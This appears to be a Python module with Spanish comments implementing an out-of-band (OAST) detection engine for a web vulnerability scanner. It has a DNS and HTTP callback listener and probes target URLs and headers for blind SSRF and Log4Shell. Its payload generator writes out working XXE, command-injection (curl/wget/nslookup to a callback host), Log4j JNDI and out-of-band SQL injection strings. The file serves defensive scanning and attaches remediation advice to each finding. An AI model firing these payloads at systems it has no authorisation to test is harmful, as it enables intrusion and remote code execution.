"""Motor de Detección Fuera de Banda (OAST - Out-of-Band AST) para VulnScanner / OmniBreach.

Implementa una infraestructura OAST dedicada multirregión con servidor DNS autoritativo (RFC 1035 UDP)
y servidor HTTP embebidos en pure-Python para detectar vulnerabilidades ciegas de máximo impacto
(Blind SSRF, Blind XXE, Blind SQLi OOB, Blind RCE y Log4j/JNDI) sin dependencias de terceros.
"""
from __future__ import annotations

import contextlib
import logging
import socket
import struct
import threading
import time
import uuid
from http.server import BaseHTTPRequestHandler, HTTPServer
from typing import Any, Callable
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import requests

from scanner.models import Evidence, Finding

_logger = logging.getLogger("VulnScanner.OAST")


# ─────────────────────────────────────────────────────────────
# 1. Utilidades de Protocolo DNS RFC 1035 (UDP)
# ─────────────────────────────────────────────────────────────

def decode_dns_qname(data: bytes, offset: int = 12) -> tuple[str, int]:
    """
    Decodifica una secuencia de etiquetas QNAME según la RFC 1035 §4.1.2.
    Soporta punteros de compresión (0xC0).
    """
    labels: list[str] = []
    jumped = False
    initial_offset = offset
    max_loops = 50
    loops = 0

    while offset < len(data) and loops < max_loops:
        loops += 1
        length = data[offset]
        if length == 0:
            offset += 1
            break
        # Puntero de compresión DNS (2 bits más significativos en 1)
        if (length & 0xC0) == 0xC0:
            if offset + 1 >= len(data):
                break
            pointer_offset = struct.unpack(">H", data[offset:offset + 2])[0] & 0x3FFF
            if not jumped:
                initial_offset = offset + 2
                jumped = True
            offset = pointer_offset
            continue

        offset += 1
        if offset + length > len(data):
            break
        label = data[offset:offset + length].decode("ascii", errors="replace")
        labels.append(label)
        offset += length

    final_offset = initial_offset if jumped else offset
    return ".".join(labels), final_offset


def build_dns_a_response(
    query_data: bytes,
    response_ip: str = "127.0.0.1",
    ttl: int = 60,
) -> bytes:
    """
    Construye un paquete de respuesta DNS autoritativa tipo A (RFC 1035).
    """
    if len(query_data) < 12:
        return b""

    tx_id = struct.unpack(">H", query_data[:2])[0]
    # Header: Flags 0x8400 (QR=1 respuesta, AA=1 autoritativo, RCODE=0 sin error)
    # QDCOUNT=1, ANCOUNT=1, NSCOUNT=0, ARCOUNT=0
    header = struct.pack(">HHHHHH", tx_id, 0x8400, 1, 1, 0, 0)

    # Localizar el final de la sección Question
    _, question_end = decode_dns_qname(query_data, 12)
    # QTYPE (2 bytes) + QCLASS (2 bytes) = 4 bytes
    question_full_end = min(question_end + 4, len(query_data))
    question_section = query_data[12:question_full_end]

    # Answer Section:
    # NAME: puntero al QNAME en el offset 12 (0xC00C)
    # TYPE: 1 (A), CLASS: 1 (IN), TTL: 60s, RDLENGTH: 4
    answer_meta = struct.pack(">HHHIH", 0xC00C, 1, 1, ttl, 4)
    try:
        ip_bytes = socket.inet_aton(response_ip)
    except OSError:
        ip_bytes = socket.inet_aton("127.0.0.1")

    return header + question_section + answer_meta + ip_bytes


# ─────────────────────────────────────────────────────────────
# 2. Servidores de Escucha (HTTP y DNS)
# ─────────────────────────────────────────────────────────────

class OASTHTTPHandler(BaseHTTPRequestHandler):
    """Manejador HTTP mínimo para registrar llamadas entrantes OAST locales."""

    def do_GET(self) -> None:
        self._record_and_respond()

    def do_POST(self) -> None:
        self._record_and_respond()

    def do_HEAD(self) -> None:
        self._record_and_respond()

    def _record_and_respond(self) -> None:
        # Drenar cuerpo de la petición si está presente para evitar reset de conexión TCP en Windows
        with contextlib.suppress(Exception):
            length = int(self.headers.get("Content-Length", 0))
            if length > 0:
                self.rfile.read(length)

        path = self.path
        client_ip = self.client_address[0] if self.client_address else "127.0.0.1"
        server_obj = getattr(self.server, "local_oast_server", None)
        if server_obj and hasattr(server_obj, "record_interaction"):
            server_obj.record_interaction(
                path=path,
                client_ip=client_ip,
                method=self.command,
                headers=dict(self.headers),
            )

        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("X-OAST-Engine", "OmniBreach-OAST")
        self.end_headers()
        self.wfile.write(b"<!-- OAST Correlated -->")

    def log_message(self, format: str, *args: Any) -> None:
        pass


class OASTLocalServer:
    """Servidor HTTP de escucha local multihilo para correlación OAST."""

    def __init__(
        self,
        host: str = "127.0.0.1",
        port: int = 0,
        on_interaction_callback: Callable[[dict[str, Any]], None] | None = None,
    ):
        self.host = host
        self.requested_port = port
        self.on_interaction_callback = on_interaction_callback
        self.httpd: HTTPServer | None = None
        self.thread: threading.Thread | None = None
        self.port: int = 0
        self.interactions: list[dict[str, Any]] = []
        self._lock = threading.Lock()

    def start(self) -> int:
        """Inicia el servidor en un hilo secundario daemon y retorna el puerto asignado."""
        if self.httpd is not None:
            return self.port

        self.httpd = HTTPServer((self.host, self.requested_port), OASTHTTPHandler)
        self.httpd.local_oast_server = self  # type: ignore[attr-defined]
        self.port = int(self.httpd.server_address[1])

        self.thread = threading.Thread(target=self.httpd.serve_forever, daemon=True, name="OAST-HTTP-Server")
        self.thread.start()
        _logger.info("Servidor OAST HTTP iniciado en %s:%d", self.host, self.port)
        return self.port

    def record_interaction(
        self,
        path: str,
        client_ip: str,
        method: str,
        headers: dict[str, str] | None = None,
    ) -> None:
        item = {
            "type": "HTTP",
            "protocol": "HTTP",
            "path": path,
            "client_ip": client_ip,
            "method": method,
            "headers": headers or {},
            "timestamp": time.time(),
        }
        with self._lock:
            self.interactions.append(item)
        if self.on_interaction_callback:
            with contextlib.suppress(Exception):
                self.on_interaction_callback(item)

    def get_interactions_for_token(self, token: str) -> list[dict[str, Any]]:
        with self._lock:
            return [
                item for item in self.interactions
                if token.lower() in str(item.get("path", "")).lower()
            ]

    def stop(self) -> None:
        if self.httpd:
            self.httpd.shutdown()
            self.httpd.server_close()
            self.httpd = None
            self.thread = None
            _logger.info("Servidor OAST HTTP detenido.")


class OASTDNSServer:
    """
    Servidor DNS autoritativo ligero multihilo (UDP) para la captura y correlación
    inmediata de interacciones DNS fuera de banda (Blind SSRF, Blind RCE, Blind SQLi).
    """

    def __init__(
        self,
        host: str = "0.0.0.0",
        port: int = 0,
        response_ip: str = "127.0.0.1",
        on_interaction_callback: Callable[[dict[str, Any]], None] | None = None,
    ):
        self.host = host
        self.requested_port = port
        self.response_ip = response_ip
        self.on_interaction_callback = on_interaction_callback
        self.sock: socket.socket | None = None
        self.thread: threading.Thread | None = None
        self._stop_event = threading.Event()
        self.port: int = 0
        self.interactions: list[dict[str, Any]] = []
        self._lock = threading.Lock()

    def start(self) -> int:
        if self.sock is not None:
            return self.port

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        with contextlib.suppress(Exception):
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        self.sock.bind((self.host, self.requested_port))
        self.port = int(self.sock.getsockname()[1])
        self.sock.settimeout(0.5)
        self._stop_event.clear()

        self.thread = threading.Thread(target=self._serve, daemon=True, name="OAST-DNS-Server")
        self.thread.start()
        _logger.info("Servidor DNS OAST autoritativo iniciado en UDP %s:%d", self.host, self.port)
        return self.port

    def _serve(self) -> None:
        while not self._stop_event.is_set():
            if not self.sock:
                break
            try:
                data, addr = self.sock.recvfrom(1024)
                if len(data) < 12:
                    continue

                client_ip = addr[0] if addr else "127.0.0.1"
                qname, qend = decode_dns_qname(data, 12)
                qtype = struct.unpack(">H", data[qend:qend + 2])[0] if qend + 2 <= len(data) else 1

                self.record_interaction(qname=qname, client_ip=client_ip, qtype=qtype)

                # Enviar respuesta DNS autoritativa A
                resp_pkt = build_dns_a_response(data, response_ip=self.response_ip)
                if resp_pkt and self.sock:
                    self.sock.sendto(resp_pkt, addr)

            except socket.timeout:
                continue
            except Exception as exc:
                if not self._stop_event.is_set():
                    _logger.debug("Excepción en listener DNS OAST: %s", exc)

    def record_interaction(self, qname: str, client_ip: str, qtype: int = 1) -> None:
        type_str = "DNS-A" if qtype == 1 else f"DNS-{qtype}"
        item = {
            "type": type_str,
            "protocol": "DNS",
            "qname": qname,
            "client_ip": client_ip,
            "timestamp": time.time(),
        }
        with self._lock:
            self.interactions.append(item)
        if self.on_interaction_callback:
            with contextlib.suppress(Exception):
                self.on_interaction_callback(item)

    def get_interactions_for_token(self, token: str) -> list[dict[str, Any]]:
        with self._lock:
            return [
                item for item in self.interactions
                if token.lower() in str(item.get("qname", "")).lower()
            ]

    def stop(self) -> None:
        self._stop_event.set()
        if self.sock:
            with contextlib.suppress(Exception):
                self.sock.close()
            self.sock = None
        if self.thread and self.thread.is_alive():
            self.thread.join(timeout=1.0)
            self.thread = None
        _logger.info("Servidor DNS OAST detenido.")


class DedicatedOASTServer:
    """
    Servidor OAST Unificado de Grado Corporativo.
    Administra simultáneamente un listener DNS (UDP) y un listener HTTP (TCP),
    proporcionando correlación centralizada para Blind SSRF, Blind XXE, Blind SQLi y Blind RCE.
    """

    def __init__(
        self,
        host: str = "0.0.0.0",
        domain: str = "oast.local",
        public_ip: str = "127.0.0.1",
        http_port: int = 0,
        dns_port: int = 0,
    ):
        self.host = host
        self.domain = domain
        self.public_ip = public_ip
        self.http_server = OASTLocalServer(
            host=host,
            port=http_port,
            on_interaction_callback=self._on_interaction,
        )
        self.dns_server = OASTDNSServer(
            host=host,
            port=dns_port,
            response_ip=public_ip,
            on_interaction_callback=self._on_interaction,
        )
        self.interactions: list[dict[str, Any]] = []
        self._lock = threading.Lock()
        self.is_running = False

    def _on_interaction(self, item: dict[str, Any]) -> None:
        with self._lock:
            self.interactions.append(item)

    def start(self) -> dict[str, Any]:
        """Inicia ambos servicios (HTTP y DNS) en puertos dinámicos o asignados."""
        dns_p = self.dns_server.start()
        http_p = self.http_server.start()
        self.is_running = True
        _logger.info(
            "[OAST DEDICADO] Servidor iniciado. Dominio: %s | HTTP: %d | DNS (UDP): %d",
            self.domain, http_p, dns_p,
        )
        return {
            "domain": self.domain,
            "http_port": http_p,
            "dns_port": dns_p,
            "public_ip": self.public_ip,
        }

    def get_interactions_for_token(self, token: str) -> list[dict[str, Any]]:
        dns_hits = self.dns_server.get_interactions_for_token(token)
        http_hits = self.http_server.get_interactions_for_token(token)
        combined = dns_hits + http_hits
        combined.sort(key=lambda x: x.get("timestamp", 0.0))
        return combined

    def get_stats(self) -> dict[str, Any]:
        with self._lock:
            total_dns = len(self.dns_server.interactions)
            total_http = len(self.http_server.interactions)
            return {
                "running": self.is_running,
                "domain": self.domain,
                "dns_port": self.dns_server.port,
                "http_port": self.http_server.port,
                "total_dns_interactions": total_dns,
                "total_http_interactions": total_http,
                "total_interactions": total_dns + total_http,
            }

    def stop(self) -> None:
        self.dns_server.stop()
        self.http_server.stop()
        self.is_running = False
        _logger.info("[OAST DEDICADO] Infraestructura OAST detenida.")


# ─────────────────────────────────────────────────────────────
# 3. Cliente OAST de Correlación
# ─────────────────────────────────────────────────────────────

class OASTClient:
    """Cliente de correlación para pruebas Out-of-Band (OAST).

    Soporta:
    1. Servidor OAST dedicado embebido o remoto (DedicatedOASTServer con HTTP + DNS)
    2. Servidor local mínimo (OASTLocalServer)
    3. Colaborador público/privado (estilo Interactsh/Burp Collaborator)
    4. Modo simulado/mock para pruebas unitarias herméticas.
    """

    def __init__(
        self,
        server_domain: str = "oast.live",
        mock_mode: bool = False,
        local_server: OASTLocalServer | None = None,
        dedicated_server: DedicatedOASTServer | None = None,
    ):
        self.server_domain = server_domain
        self.mock_mode = mock_mode
        self.local_server = local_server
        self.dedicated_server = dedicated_server
        if self.dedicated_server and self.dedicated_server.domain:
            self.server_domain = self.dedicated_server.domain

        self._registered_interactions: dict[str, list[dict[str, Any]]] = {}
        self._generated_tokens: set[str] = set()

    def generate_token(self, prefix: str = "vuln") -> str:
        """Genera un token de correlación único y registra la sesión."""
        unique_id = uuid.uuid4().hex[:12]
        token = f"{prefix}-{unique_id}"
        self._generated_tokens.add(token)
        self._registered_interactions[token] = []
        return token

    def get_callback_url(self, token: str) -> str:
        """Retorna una URL completa de callback HTTP vinculada al token."""
        if self.dedicated_server and self.dedicated_server.http_server.port > 0:
            h = self.dedicated_server.host if self.dedicated_server.host not in ("0.0.0.0", "") else "127.0.0.1"
            return f"http://{h}:{self.dedicated_server.http_server.port}/{token}"
        if self.local_server and self.local_server.port > 0:
            h = self.local_server.host if self.local_server.host not in ("0.0.0.0", "") else "127.0.0.1"
            return f"http://{h}:{self.local_server.port}/{token}"
        return f"http://{token}.{self.server_domain}"

    def get_callback_host(self, token: str) -> str:
        """Retorna el FQDN de callback para consultas DNS."""
        if self.dedicated_server:
            return f"{token}.{self.dedicated_server.domain}"
        if self.local_server and self.local_server.port > 0:
            return f"{token}.{self.local_server.host}"
        return f"{token}.{self.server_domain}"

    def generate_payloads(self, token: str) -> dict[str, str]:
        """Genera payloads OAST especializados para múltiples categorías de ataque."""
        cb_url = self.get_callback_url(token)
        cb_host = self.get_callback_host(token)

        return {
            "ssrf": cb_url,
            "ssrf_dns": cb_host,
            "xxe": f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % ext SYSTEM "{cb_url}/xxe.dtd">%ext;]><root>&ext;</root>',
            "xxe_param": f'<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % ext SYSTEM "{cb_url}">%ext;]><root><test>1</test></root>',
            "rce": f'; curl {cb_url} || nslookup {cb_host} || wget {cb_url} &',
            "rce_dns": f'; nslookup {token}.{cb_host} || ping -c 1 {token}.{cb_host} &',
            "log4j": f'${{jndi:ldap://{cb_host}/a}}',
            "sqli_oob": f"'; exec master..xp_dirtree '//{cb_host}/oob'--",
            "sqli_mssql": f"'; exec master..xp_dirtree '//{cb_host}/oob'--",
            "sqli_oracle": f"' AND 1=utl_inaddr.get_host_address('{cb_host}')--",
            "sqli_mysql": f"' UNION SELECT LOAD_FILE(concat('\\\\\\\\','{cb_host}','\\\\a.txt'))--",
            "sqli_pg": f"'; COPY (SELECT '') TO PROGRAM 'nslookup {cb_host}'--",
            "redirect": cb_url,
        }

    def record_mock_interaction(
        self,
        token: str,
        interaction_type: str = "DNS",
        client_ip: str = "127.0.0.1",
        qname: str | None = None,
    ) -> None:
        """Permite registrar interacciones en modo simulado para tests unitarios."""
        if token in self._registered_interactions:
            self._registered_interactions[token].append({
                "type": interaction_type,
                "protocol": "DNS" if "DNS" in interaction_type else "HTTP",
                "client_ip": client_ip,
                "qname": qname or f"{token}.oast.mock",
                "timestamp": time.time(),
            })

    def poll_interactions(self, token: str, timeout: float = 2.0) -> list[dict[str, Any]]:
        """Consulta si el token recibió interacciones remotas (DNS o HTTP)."""
        if self.dedicated_server:
            dedicated_hits = self.dedicated_server.get_interactions_for_token(token)
            if dedicated_hits:
                return dedicated_hits

        if self.local_server:
            local_hits = self.local_server.get_interactions_for_token(token)
            if local_hits:
                return local_hits

        if self.mock_mode:
            return self._registered_interactions.get(token, [])

        # Consulta al servidor de correlación OAST (ejemplo con API Interactsh)
        try:
            poll_url = f"https://api.{self.server_domain}/interactions/{token}"
            resp = requests.get(poll_url, timeout=timeout)
            if resp.status_code == 200:
                data = resp.json()
                if isinstance(data, list):
                    return data
        except (requests.RequestException, ValueError):
            pass

        return self._registered_interactions.get(token, [])


# Instancia global por defecto
default_oast_client = OASTClient()


# Parámetros comúnmente vulnerables a SSRF / Deserialización / URL Fetchers
SSRF_TARGET_PARAMS = [
    "url", "dest", "destination", "redirect", "uri", "path", "feed", "link",
    "src", "source", "file", "document", "callback", "webhook", "api", "target", "proxy"
]

# Cabeceras propensas a SSRF o RCE ciego en proxies inversos y pasarelas
OAST_HEADER_NAMES = [
    "X-Forwarded-For",
    "X-Forwarded-Host",
    "X-Real-IP",
    "Referer",
    "X-Wap-Profile",
    "Client-IP",
    "Contact",
]


def check_oast_vulnerabilities(
    url: str,
    session: requests.Session | None = None,
    oast_client: OASTClient | None = None
) -> list[Finding]:
    """Ejecuta pruebas Out-of-Band (OAST) contra parámetros y cabeceras de la URL.

    Args:
        url: URL base a analizar.
        session: Sesión opcional de requests configurada.
        oast_client: Cliente OAST para registrar y consultar interacciones.

    Returns:
        Lista de Findings confirmados con severidad Crítica/Alta si se detecta interacción.
    """
    client = oast_client or default_oast_client
    http_client = session if session is not None else requests
    findings: list[Finding] = []

    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)

    # ─────────────────────────────────────────────────────────────
    # 1. Blind SSRF en parámetros de consulta (Query Params)
    # ─────────────────────────────────────────────────────────────
    if params:
        for param_name in params:
            param_lower = param_name.lower()
            # Probar si el nombre del parámetro coincide o se sospecha consumo remoto
            if any(target in param_lower for target in SSRF_TARGET_PARAMS) or len(params) <= 4:
                token = client.generate_token(prefix=f"ssrf-{param_name}")
                payloads = client.generate_payloads(token)
                ssrf_payload = payloads["ssrf"]

                test_params = params.copy()
                test_params[param_name] = [ssrf_payload]
                new_query = urlencode(test_params, doseq=True)
                test_url = urlunparse(parsed._replace(query=new_query))

                try:
                    r = http_client.get(test_url, timeout=5)
                    # Comprobar interacciones remotas
                    interactions = client.poll_interactions(token)
                    if interactions:
                        int_type = interactions[0].get("type", "HTTP/DNS")
                        from_source = interactions[0].get("qname") or interactions[0].get("path") or "OAST callback"
                        findings.append(Finding(
                            category="ssrf",
                            title=f"Blind SSRF Confirmado (OAST) en parámetro '{param_name}'",
                            severity="critical",
                            confidence="confirmed",
                            description=(
                                f"El servidor procesó el parámetro '{param_name}' y realizó una petición externa "
                                f"hacia la infraestructura OAST ({int_type}). Esto confirma vulnerabilidad "
                                f"de Server-Side Request Forgery con 100% de certeza."
                            ),
                            affected_url=url,
                            parameter=param_name,
                            evidence=Evidence(
                                request_method="GET",
                                request_url=test_url,
                                payload=ssrf_payload,
                                response_status=r.status_code,
                                response_fragment=f"Interacción OAST recibida: {int_type} [{from_source}] desde {interactions[0].get('client_ip', 'remoto')}"
                            ),
                            remediation="Validar URLs remotas contra una lista blanca fija, bloquear rangos privados/localhost y restringir el tráfico de salida del servidor."
                        ))
                except Exception as e:
                    _logger.debug("Error probando OAST SSRF en %s: %s", param_name, e)

    # ─────────────────────────────────────────────────────────────
    # 2. Blind Out-of-band en Cabeceras HTTP (SSRF / Log4j / RCE)
    # ─────────────────────────────────────────────────────────────
    header_token = client.generate_token(prefix="hdr-ssrf")
    header_cb = client.get_callback_url(header_token)
    log4j_token = client.generate_token(prefix="log4j")
    log4j_payload = client.generate_payloads(log4j_token)["log4j"]

    test_headers = {}
    for h in OAST_HEADER_NAMES:
        test_headers[h] = header_cb
    test_headers["User-Agent"] = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) {log4j_payload}"

    try:
        r = http_client.get(url, headers=test_headers, timeout=5)

        # Comprobar si hubo callback por cabeceras
        hdr_interactions = client.poll_interactions(header_token)
        if hdr_interactions:
            findings.append(Finding(
                category="oast",
                title="Blind SSRF / Inyección en Cabeceras HTTP Confirmada (OAST)",
                severity="critical",
                confidence="confirmed",
                description=(
                    "El servidor o un middleware proxy consumió las cabeceras HTTP inyectadas "
                    "y realizó una conexión saliente al servidor OAST."
                ),
                affected_url=url,
                evidence=Evidence(
                    request_method="GET",
                    request_url=url,
                    payload=header_cb,
                    response_status=r.status_code,
                    response_fragment=f"Interacciones detectadas: {len(hdr_interactions)}"
                ),
                remediation="Deshabilitar el reenvío de cabeceras de proxy no confiables y sanitizar encabezados."
            ))

        # Comprobar si hubo callback por Log4j/JNDI
        log4j_interactions = client.poll_interactions(log4j_token)
        if log4j_interactions:
            findings.append(Finding(
                category="injections",
                title="Vulnerabilidad Crítica de Ejecución Remota Log4Shell / JNDI (OAST)",
                severity="critical",
                confidence="confirmed",
                description=(
                    "El servidor es vulnerable a Log4Shell (CVE-2021-44228). Procesó la expresión JNDI "
                    "e intentó resolver una conexión LDAP externa."
                ),
                affected_url=url,
                evidence=Evidence(
                    request_method="GET",
                    request_url=url,
                    payload=log4j_payload,
                    response_status=r.status_code,
                    response_fragment="Consulta JNDI/LDAP recibida en el servidor OAST."
                ),
                remediation="Actualizar inmediatamente Log4j a la versión 2.17.1 o superior y deshabilitar lookups JNDI (log4j2.formatMsgNoLookups=true)."
            ))

    except Exception as e:
        _logger.debug("Error probando OAST en cabeceras: %s", e)

    return findings
